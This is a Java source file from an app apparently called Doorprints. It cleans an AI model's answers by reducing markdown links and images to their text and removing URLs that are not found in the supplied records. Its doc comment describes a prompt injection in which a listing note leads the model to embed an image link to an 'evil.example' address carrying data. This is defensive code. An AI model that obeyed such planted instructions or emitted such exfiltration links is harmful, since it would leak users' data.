/*
 * Copyright 2026 Sriram (Sriram-Codes-SW)
 *
 * This file is part of Doorprints.
 *
 * Doorprints is free software: you can redistribute it and/or modify it under the terms of the GNU Affero General
 * Public License as published by the Free Software Foundation, version 3 of the License.
 *
 * Doorprints is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied
 * warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Affero General Public License for more
 * details.
 *
 * You should have received a copy of the GNU Affero General Public License along with Doorprints (the file LICENSE;
 * the file NOTICE has additional permissions under section 7). If not, see <https://www.gnu.org/licenses/>.
 *
 * SPDX-License-Identifier: AGPL-3.0-only
 */

package app.doorprints.server.ai;

import java.util.HashSet;
import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * The model's answer with no way to carry data out (docs/03 §13.1, S4b-BL-178). A model that obeys an instruction in a
 * listing note can write {@code ![x](https://evil.example/?d=...)} or a link into its answer; the app shows answers as
 * plain text, but a copied answer or a later markdown view would carry the address.
 *
 * <p>{@code ![alt](url)} and {@code [text](url)} become {@code alt} and {@code text}; an http(s) address that does not
 * appear in the context (the records the model was given, after contact removal, not the question) becomes
 * {@code [link removed]}, one that does is kept. Applied to the answer of Ask and to the summary and reasons of Plan,
 * after the model returns. A claim such as "deleted" is not checked. Ported to the website ({@code cleanAnswer} in
 * {@code ai-core.ts}) and the phones ({@code AnswerText}); the shared vectors are {@code answerText}.
 */
public final class AnswerText {

    public static final String LINK_REMOVED = "[link removed]";

    // The text may hold one level of brackets (so "[see [house:<id>]](...)" keeps the citation). Every part is bounded
    // and the alternatives start with different characters, so a scan stays linear in the input.
    private static final Pattern MD_LINK = Pattern.compile(
            "!?\\[((?:[^\\[\\]\\n]|\\[[^\\[\\]\\n]*\\]){0,500})\\]\\([ \\t\\r\\n]{0,3}[^() \\t\\r\\n]{0,2000}"
                    + "(?:[ \\t\\r\\n]+\"[^\"\\n]{0,200}\")?[ \\t\\r\\n]{0,3}\\)");
    // An address ends at the first character it cannot hold, so the text after it (Hindi, Tamil) is left alone.
    private static final Pattern URL_TEXT = Pattern.compile("(?i)https?://[A-Za-z0-9\\-._~:/?#@!$&*+,;=%]+");
    private static final String URL_TAIL = ".,;:!?";

    private AnswerText() {
    }

    /** The address without the punctuation a sentence puts after it: the length to keep. */
    private static int keep(String url) {
        int end = url.length();
        while (end > 0 && URL_TAIL.indexOf(url.charAt(end - 1)) >= 0) end--;
        return end;
    }

    /**
     * {@code text} with links and images reduced to their text and any address not in {@code context} replaced by
     * {@code [link removed]}; null or empty text is returned as it is.
     */
    public static String clean(String text, String context) {
        if (text == null || text.isEmpty()) return text;
        var known = new HashSet<String>();
        var inContext = URL_TEXT.matcher(context == null ? "" : context);
        while (inContext.find()) {
            var url = inContext.group();
            known.add(url.substring(0, keep(url)).toLowerCase(Locale.ROOT));
        }
        var unlinked = new StringBuilder(text.length());
        var link = MD_LINK.matcher(text);
        while (link.find()) link.appendReplacement(unlinked, Matcher.quoteReplacement(link.group(1)));
        link.appendTail(unlinked);

        var out = new StringBuilder(unlinked.length());
        var bare = URL_TEXT.matcher(unlinked);
        while (bare.find()) {
            var m = bare.group();
            int end = keep(m);
            var kept = known.contains(m.substring(0, end).toLowerCase(Locale.ROOT));
            bare.appendReplacement(out, Matcher.quoteReplacement(kept ? m : LINK_REMOVED + m.substring(end)));
        }
        bare.appendTail(out);
        return out.toString();
    }
}
